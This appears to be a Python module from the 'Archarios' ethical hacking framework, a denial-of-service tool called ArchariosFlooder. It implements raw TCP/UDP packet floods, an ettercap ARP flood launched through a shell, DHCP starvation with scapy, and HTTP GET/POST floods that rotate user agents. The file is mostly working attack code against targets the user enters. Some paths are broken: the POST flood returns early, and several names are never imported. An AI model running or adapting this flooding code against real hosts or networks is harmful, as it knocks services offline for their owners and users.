#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Archarios Framework :: The Novice's Ethical Hacking Framework
Copyright(C) 2018-2019 :: Catayao56 <Catayao56@gmail.com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

import random

from core import misc
from core import error
from core import logger
from core import exceptions

# Put all needed dependencies here!
try:
    import re
    import time
    import socket
    import requests
    import traceback
    import subprocess
    from core import gethost
    from core import printer
    from core import asciigraphs

    import threading
    import queue
    from bs4 import BeautifulSoup
    from scapy.all import get_if_raw_hwaddr, Ether, IP
    from scapy.all import UDP, RandString, DHCP, sendp
    from scapy.all import conf as confs

except BaseException as err:
    print("While importing dependency modules, an error occured: {0}".format(str(err)))
    importerror = True

else:
    importerror = False

"""
Template for creating a module for Archários Framework.
"""

# Put all objects here that needs to be tested.
objects = ["ArchariosFrameworkModule", "ArchariosFrameworkModule.__init__",
        "ArchariosFrameworkModule.prepare", "ArchariosFrameworkModule.run",
        "ArchariosFrameworkModule.validate_attack_mode",
        "ArchariosFrameworkModule.validate_protocol",
        "ArchariosFrameworkModule.validate_port_number",
        "ArchariosFrameworkModule.validate_target",
        "ArchariosFrameworkModule.get_socket_obj"]


class ArchariosFrameworkModule:
    """
    class ArchariosFrameworkModule():
        Main class of Archários Framework modules.
    """

    def __init__(self, *args, **kwargs):
        # Module Information

        # NOTE: DEV0004: Modify THIS DICTIONARY ONLY!
        self.module_info = {
                # Module name
                "name": "ArchariosFlooder",
                # Module brief description
                "bdesc": "A simple Denial-of-Service Tool.",
                # Module version
                "version": 1.2,
                # Module author
                "author": "Catayao56",
                # Module status
                "status": "Stable",
                # Date created (Please follow the format)
                "created": "Aug. 12 2018",
                # Latest update (Please follow the format)
                "last_update": "Aug. 12 2018",
                # Long description
                "ldesc": """\
<t>Archarios Flooder<end> :: <b>A simple Denial-of-Service Tool.<end>

<u>Archarios Flooder<end> is a simple DoS (Denial-of-Service) tool
that you can use for website with low bandwidth and security.

It is very customizeable so it can suit your needs.
             """.replace('<t>', misc.FB + misc.FU + misc.FI).replace(
                 '<end>', misc.END).replace('<u>', misc.FU).replace(
                 '<i>', misc.FI).replace('<b>', misc.FB).replace(
                 '<h>', misc.FB + misc.FI).replace('<n>',
                 misc.FB + misc.CY)
                }

        # NOTE: DEV0004: Modify THIS DICTIONARY ONLY!
        # Update history
        self.version_history = {
                    1.0: "Initial update",
                    1.1: "Default attack added.",
                    1.2: "ARP attack added."
                    }

        self._parse_module_info()
        # Get sufficient information from framework.
        self.debug = kwargs.get('debug', False)
        self.logger = kwargs.get('logger', None)
        """
        self.logger = logger.LoggingObject(
                name=self.module_info['name'],
                session_id=random.randint(100000, 999999),
                logfile='data/{0}.log'.format(self.module_info['name'])
                )
        self.logger.set_logging_level('NOTSET')
        if self.debug is True:
            self.logger.enable_logging()
        """

        self.fname = kwargs.get('fname', 'Archários Framework')
        self.fversion = kwargs.get('fversion', None)
        self.fcodename = kwargs.get('fcodename', None)
        self.fdescription = kwargs.get('fbanner', None)
        self.fbanner = kwargs.get('fbanner', None)
        self.userlevel = kwargs.get('userlevel', 3)
        self.from_API = kwargs.get('API', False)

    def _parse_module_info(self):
        """
        def _parse_module_info():
            Parse module information for getting attention of user not
            following the guidelines.
        """

        # NOTE: DEV0004: Don't modify this method!

        mo_in = self.module_info

        # Check for variable types.

        if type(mo_in['name']) is not str:
            raise TypeError("Module name must be a string!")

        if type(mo_in['bdesc']) is not str:
            raise TypeError("Module's brief description must be a string!")

        if type(mo_in['version']) is not float and \
                type(mo_in['version']) is not int:
                    raise TypeError("Version must be int or float!")

        if type(mo_in['author']) is not str:
            raise TypeError("`author` variable must be str!")

        if type(mo_in['created']) is not str:
            raise TypeError("`created` variable must be a str!")

        if type(mo_in['last_update']) is not str:
            raise TypeError("`last_update` variable must be a str!")

        if type(mo_in['ldesc']) is not str:
            raise TypeError("`ldesc` variable must be a str!")

        if type(self.version_history) is not dict:
            raise TypeError("`version_history` variable must be a dict!")

        if type(mo_in['status']) is not str:
            raise TypeError("`status` variable must be a str!")

        # Check for value contents.

        if len(mo_in['name']) > 20 or len(mo_in['name']) < 1:
            raise ValueError("Module name must be 1-20 characters!")

        if len(mo_in['bdesc']) > 100 or len(mo_in['bdesc']) < 1:
            raise ValueError("Module's brief description must be 1-100 characters!")

        if mo_in['version'] < 0.1:
            raise ValueError("Version must be 0.1 and/or above in form of int or float!")

        if len(mo_in['author']) < 1 or len(mo_in['author']) > 50:
            raise ValueError("`author` variable must be 1-50 characters!")

	# Will be a mess for sure...
        try:
            created = mo_in['created'].split(' ')
            if created[0].replace('.', '') not in ('Jan', 'Feb', 'Mar',
                    'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sept', 'Oct',
                    'Nov', 'Dec'):
                raise ValueError("Please don't modify `created` variable!")

            try:
                created[1] = int(created[1])

            except(TypeError, ValueError):
                raise ValueError("Please don't modify `created` variable!")

            try:
                created[2] = int(created[2])

            except(TypeError, ValueError):
                raise ValueError("Please don't modify `created` variable!")

        except IndexError:
            raise ValueError("Please don't modify `created` variable!")

        # Messy code ended... Well, not really :p
        try:
            last_updated = mo_in['last_update'].split(' ')
            if last_updated[0].replace('.', '') not in ('Jan', 'Feb', 'Mar',
                    'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sept', 'Oct',
                    'Nov', 'Dec'):
                raise ValueError("Please don't modify `created` variable!")

            try:
                last_updated[1] = int(last_updated[1])

            except(TypeError, ValueError):
                raise ValueError("Please don't modify `created` variable!")

            try:
                last_updated[2] = int(last_updated[2])

            except(TypeError, ValueError):
                raise ValueError("Please don't modify `created` variable!")

        except(IndexError):
            raise ValueError("Please don't modify `created` variable!")

        if len(mo_in['ldesc']) < 15:
            raise ValueError("Module's long description must be 15+ characters!")

        for key in self.version_history:
            if type(key) in (str, float):
                pass

            else:
                raise ValueError("version_history contents must be pairs of int/float and string!")

            if type(self.version_history[key]) is str:
                pass

            else:
                raise ValueError("version_history contents must be pairs of int/float and string!")

        if mo_in['status'].lower() not in ('stable', 'experimental',
                'unstable'):
            raise ValueError("`status` variable must have the value `stable`, `experimental`, or `unstable` only!")

    def show_module_info(self):
        """
        def show_module_info():
            Print module info.
        """

        # NOTE: DEV0004: Don't modify this method!

        result = """
==================================================
{0}{1}Name{2}: {3}
{0}{1}Version{2}: {4}
{0}{1}Author{2}: {5}
{0}{1}Brief Description{2}: {6}

{0}{1}Current Status{2}: {7}
{0}{1}Created On{2}: {8}
{0}{1}Last_Update{2}: {9}

{0}{1}Description{2}:

{10}
""".format(
        misc.FB, misc.CR, misc.END, self.module_info['name'],
        self.module_info['version'], self.module_info['author'],
        self.module_info['bdesc'], self.module_info['status'],
        self.module_info['created'], self.module_info['last_update'],
        self.module_info['ldesc'])

        ver_hist = """
{0}{1}Version History{2}:
""".format(misc.FB, misc.CR, misc.END)
        for version in self.version_history:
            ver_hist += "\n\t{0}: {1}".format(version, self.version_history[version])

        if self.from_API is False:
            print(result)
            print(ver_hist)
            print('\n==================================================')

        else:
            return(result + '\n' + ver_hist +
                    '\n\n==================================================')

    def prepare(self):
        """
        def prepare():
            Return options required for run() method.
        """

        # NOTE: DEV0004: This is the method you will work on!
        # NOTE: DEV0004: Modify those dictionaries only!

        # Format: key + default_value
                # Example: "target": "192.168.0.1"
        values = {
                "target": "localhost",
                "port": 0,
                "protocol": "tcp",
                "attack_mode": "default",
                "timeout": 0.01,
                "packet_size": 2048,
                # "post_data": ""
                }

        # Format: key + info
                # Example: "target": "The target to test."
        vhelp = {
                "target": "The target machine to attack.",
                "port": "Port of the target machine to attack.",
                "protocol": "Protocol to use: `tcp` or `udp`",
                "attack_mode": "Attack mode to use; must be `default`, \
`arp`, `dhcp` or `web`. (`show info` for more info.)",
                "timeout": "Grace period for every connection attempts.",
                "packet_size": "Packet to send (When attack_mode is `default`.)",
                # "post_data": "POST data to send with the request."
                }

        return values, vhelp

    def run(self, values):
        """
        def run():
            Run the module.

            If call is from API, return tuple ``(0, "transcipt")``.
            tuple[0] is return code, and tuple[1] is transcript of result.
        """

        # NOTE: DEV0004: This is the method you will work on!

        if self.from_API is True:
            return (0, [error.ErrorCodes().ERROR0005().split('\n')])

        else:
            if self.validate_attack_mode(values['attack_mode'],
                    values['packet_size']) is False:
                return 1

            if self.validate_protocol(values['protocol']) is False:
                return 2

            if self.validate_port_number(values['port']) is False:
                return 3

            if self.validate_target(values['target'], values['port'], \
                    values['attack_mode'], values['protocol']) is False:
                return 4

            printer.Printer().print_with_status("Press enter to start attack!", 1)
            input()
            printer.Printer().print_with_status("Starting attack!", 0)
            print(misc.CGR + "[i] Press CTRL+C or CTRL+D to stop attack." + misc.END)
            if values['attack_mode'].lower() == 'default':
                while True:
                    try:
                        try:
                            conn = self.get_socket_obj(values['protocol'])
                            conn.connect((values['target'], values['port']))
                            conn.sendall(random._urandom(values['packet_size']))
                            time.sleep(values['timeout'])

                        except(KeyboardInterrupt, EOFError):
                            printer.Printer().print_with_status("Attack stopped.", 1)
                            return 0

                        except BaseException as err:
                            printer.Printer().print_with_status(str(err), 2)

                    except(KeyboardInterrupt, EOFError):
                        printer.Printer().print_with_status("Attack stopped.", 1)
                        return 0

            elif values['attack_mode'].lower() == 'arp':
                try:
                    if os.name == 'nt':
                        printer.Printer().print_with_status("This method is not available on Windows!", 2)
                        return 10
                    
                    if subprocess.getstatusoutput('which xterm')[0] == 0:
                        if subprocess.getstatusoutput('which ettercap')[0] == 0:
                            pass

                        else:
                            printer.Printer().print_with_status("Ettercap not installed!", 2)
                            return 6

                    else:
                        printer.Printer().print_with_status("xterm not installed!", 2)
                        return 7

                    interface = input("Enter interface name for {0} \
(e.g. eth0): ".format(values['target']))
                    router_ip = input("Enter router's IP Address: ")

                    try:
                        arpflood_command = "xterm -e ettercap -i {0} -Tq -P rand_flood /{1}// /{2}//".format(
                                interface,
                                router_ip,
                                values['target'])
                        subprocess.Popen(arpflood_command,
                                stderr=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                shell=True)
                        printer.Printer().print_with_status("Press enter or CTRL+C \
to stop attack.", 0)
                        misc.ProgramFunctions().pause()
                        raise KeyboardInterrupt

                    except Exception as err:
                        printer.Printer().print_with_status(str(err), 2)
                        return 8

                except(KeyboardInterrupt, EOFError):
                    printer.Printer().print_with_status("Attack stopped.", 1)
                    result = subprocess.getstatusoutput('killall ettercap')
                    if result[0] == 0:
                        return 0

                    else:
                        printer.Printer().print_with_status("Cannot kill ettercap! \
Please manually kill ettercap by typing `killall ettercap` in your terminal.", 1)
                        return 0

            elif values['attack_mode'].lower() == 'dhcp':
                last = values['packet_size']

                threads = []
                try:
                    if last != 0:
                        for i in range(0, last):
                            DHCPr = DHCPRequest(values['target'], i + 2)
                            DHCPr.start()
                            threads.append(DHCPr)

                    else:
                        i = 2
                        while True:
                            DHCPr = DHCPRequest(values['target'], i)
                            DHCPr.start()
                            threads.append(DHCPr)
                            i += 1

                except(KeyboardInterrupt, EOFError):
                    for thread in threads:
                        thread.join()

                    printer.Printer().print_with_status("Attack stopped.", 1)
                    return 0

            elif values['attack_mode'].lower() == 'web':
                print("[01] HTTP")
                print("[02] HTTPS")
                print()
                while True:
                    try:
                        schema = int(input("What schema will we use? > "))
                        if schema == 1:
                            schema = 'http://'
                            break
    
                        elif schema == 2:
                            schema = 'https://'
                            break
    
                        else:
                            continue
    
                    except(ValueError, TypeError, EOFError, KeyboardInterrupt):
                        continue
    
                try:
                    print("Trying to connect to {0}{1}:{2}".format(schema, values['target'], values['port']))
                    response = requests.get("{0}{1}:{2}".format(schema, values['target'], values['port']))
                    if response.status_code == 200:
                        pass
                    
                    else:
                        printer.Printer().print_with_status(error.ErrorClass().ERROR0006(), 1)
                        time.sleep(3)
                        
                    print("Response Code: {0}".format(str(response.status_code)))
    
                except BaseException as err:
                    printer.Printer().print_with_status(str(err), 2)
                    return 9
                
                print("[01] HTTP GET attack")
                print("[02] HTTP POST attack")
                print("[03] HTTP GET/POST attack")
                print("\nNOTE: When using attacks with POST, URL must handle POSTS.")
                print("Otherwise, it will not be effective. (Example: `http://localhost/target.php`)\n")
                http_get_mode = False
                http_post_mode = False
                while True:
                    try:
                        http_flood_mode = int(input("What technique will we use? > "))
                        if http_flood_mode == 1:
                            http_get_mode = True
                            break
                            
                        elif http_flood_mode == 2:
                            http_post_mode = True
                            break
                            
                        elif http_flood_mode == 3:
                            http_get_mode = True
                            http_post_mode = True
                            break
                        
                        else:
                            continue
                        
                    except(ValueError, TypeError, EOFError, KeyboardInterrupt):
                        continue
                    
                while True:
                    try:
                        # https://kb.mazebolt.com/knowledgebase/https-flood-with-browser-emulation/
                        # https://kb.mazebolt.com/knowledgebase/https-flood-with-browser-emulation/
                        # Browse like a spider...
                        browser_emulation = input("Enable Browser Emulation? (y/n) > ")
                        if browser_emulation.lower() == 'y':
                            browser_emulation = True
                            break
                        
                        elif browser_emulation.lower() == 'n':
                            browser_emulation = False
                            break
                        
                        else:
                            continue
                        
                        
                    except(ValueError, TypeError, EOFError, KeyboardInterrupt):
                        continue
                    
                headers = {"user-agent": ""}
                with open("data/user_agents.txt", 'r') as ua:
                    uas = ua.readlines()
                
                headers["user-agent"] = uas[random.randint(0, len(uas) - 1)].replace('\n', '')
                
                slashes = 0
                for targ in values['target']:
                    # print(slashes)  # DEV0005
                    if targ == '/':
                        slashes += 1
                        
                    else:
                        pass
                    
                while True:
                    if slashes == 2:
                        final_target = "{0}{1}:{2}".format(schema, values['target'], values['port'])
                        
                    else:
                        final_target = "{0}{1}:{2}/{3}".format(schema, values['target'].partition('/')[0], values['port'], values['target'].partition('/')[2])
                        
                    # print(final_target)
                    printer.Printer().print_with_status("Starting Attack...", 0)
                    printer.Printer().print_with_status("Press CTRL+C or CTRL+D to abort...", 1)
                    if http_get_mode is True and http_post_mode is False:
                        connection_stable = True
                        while True:
                            try:
                                headers["user-agent"] = uas[random.randint(0, len(uas) - 1)].replace('\n', '')
                                # print(headers["user-agent"])  # DEV0005
                                try:
                                    recv = requests.get(final_target, headers=headers)
                                    
                                except(requests.exceptions.ConnectionError):
                                    printer.Printer().print_with_status("An existing connection was forcibly closed by the remote host. The host may be down.", 2)
                                    connection_stable = False
                                    continue
                                
                                except(KeyboardInterrupt, EOFError):
                                    printer.Printer().print_with_status("Aborting...", 1)
                                    return 0
                                
                                else:
                                    if connection_stable is False:
                                        printer.Printer().print_with_status("We are now connected!", 0)
                                    
                                    connection_stable = True
                                    
                                finally:
                                    time.sleep(values['timeout'])
                                
                            except(KeyboardInterrupt, EOFError):
                                printer.Printer().print_with_status("Aborting...", 1)
                                return 0

                                
                    elif http_get_mode is False and http_post_mode is True:
                        connection_stable = True
                        headers["content-type"] = "form-data"
                        
                        # 1.Get page data
                        # 2.Find form
                        # 3.Flood POST
                        try:
                            resp = requests.get(final_target, headers=headers)
                        
                        except:
                            traceback.print_exc()
                            return 20
                            
                        soup = BeautifulSoup(resp.text, 'html.parser')
                        form = soup.find(name='form', action=re.compile(r'OrgShortNm'))
                        print(form, '\n', type(form))
                        return 0
                        payload = {}
                        while True:
                            try:
                                headers["user-agent"] = uas[random.randint(0, len(uas) - 1)].replace('\n', '')
                                # print(headers["user-agent"])  # DEV0005
                                try:
                                    recv = requests.post(final_target, headers=headers, data=payload)
                                    
                                except(requests.exceptions.ConnectionError):
                                    printer.Printer().print_with_status("An existing connection was forcibly closed by the remote host. The host may be down.", 2)
                                    connection_stable = False
                                    continue
                                
                                except(KeyboardInterrupt, EOFError):
                                    printer.Printer().print_with_status("Aborting...", 1)
                                    return 0
                                
                                else:
                                    if connection_stable is False:
                                        printer.Printer().print_with_status("We are now connected!", 0)
                                    
                                    connection_stable = True
                                    
                                finally:
                                    time.sleep(values['timeout'])
                                
                            except(KeyboardInterrupt, EOFError):
                                printer.Printer().print_with_status("Aborting...", 1)
                                return 0
                
            else:
                printer.Printer().print_with_status("Invalid attack_mode!", 2)
                return 5

    def validate_attack_mode(self, attack_mode, packet_size):
        printer.Printer().print_with_status("Validating attack_mode...", 0)
        if attack_mode.lower() in ('default', 'arp', 'dhcp', 'web'):
            if attack_mode.lower() in ('default', 'arp', 'dhcp'):
                if type(packet_size) is not int:
                    printer.Printer().print_with_status("Invalid packet_size! Aborting attack.", 2)
                    return False

                if packet_size < 1 or packet_size > 65535:
                    printer.Printer().print_with_status("Invalid packet_size! Aborting attack.", 2)
                    return False

            else:
                pass

            return True

        else:
            printer.Printer().print_with_status("Invalid attack_mode! Aborting attack.", 2)
            return False

    def validate_protocol(self, protocol):
        printer.Printer().print_with_status("Validating protocol...", 0)
        if protocol.lower() in ('tcp', 'udp'):
            return True

        else:
            printer.Printer().print_with_status("Invalid protocol! Aborting attack.", 2)
            return False

    def validate_port_number(self, port):
        if type(port) is not int:
            printer.Printer().print_with_status("Port must be an integer!", 2)
            return False

        else:
            if port < 1 or port > 65535:
                printer.Printer().print_with_status("Port must be 1~65535 only!", 2)
                return False

            else:
                return True

    def validate_target(self, target, port, attack_mode, protocol):
        """
        def validate_target():
            Check if target is valid.
        """

        printer.Printer().print_with_status("Trying to connect to \
``{0}``...".format(target), 0)
        if attack_mode.lower() in ('default', 'arp', 'dhcp'):
            try:
                conn = self.get_socket_obj(protocol)
                conn.connect((target, port))
                conn.close()

            except BaseException as err:
                printer.Printer().print_with_status(str(err), 2)
                return False

            else:
                return True

        elif attack_mode.lower() in ('web',):
            print("[01] HTTP")
            print("[02] HTTPS")
            print()
            while True:
                try:
                    schema = int(input("What schema will we use? > "))
                    if schema == 1:
                        schema = 'http://'
                        break

                    elif schema == 2:
                        schema = 'https://'
                        break

                    else:
                        continue

                except(ValueError, TypeError, EOFError, KeyboardInterrupt):
                    continue

            try:
                response = requests.get(schema + target + ':' + str(port))

            except BaseException as err:
                printer.Printer().print_with_status(str(err), 2)
                return False
            
            else:
                # print(response)  # DEV0005
                return True

        else:
            printer.Printer().print_with_status("Unknown attack_mode! Aborting attack.", 2)
            return False

    def get_socket_obj(self, protocol):
        """
        def get_socket_obj():
            Return a socket object to use.
        """

        if protocol.lower() == 'tcp':
            return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        elif protocol.lower() == 'udp':
            return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        else:
            printer.Printer().print_with_status("Invalid protocol! Aborting attack.", 2)
            raise exceptions.InvalidParameterError()


class DHCPRequest(threading.Thread):
    last = 0
    router = None

    def __init__(self, router, last):
        self.router = router
        self.last = str(last)
        threading.Thread.__init__(self)

    def run(self):
        baseip = ".".join(self.router.split('.')[0:-1]) + '.'
        targetip = baseip+self.last
        confs.checkIPaddr = False
        hw = get_if_raw_hwaddr(confs.iface)
        dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/\
                IP(src="0.0.0.0",dst="255.255.255.255")/\
                UDP(sport=68, dport=67)/\
                BOOTP(chaddr=RandString(RandNum(1,50)))/\
                DHCP(options=[("message-type","discover"),"end"])
        sendp(dhcp_discover, verbose=0)
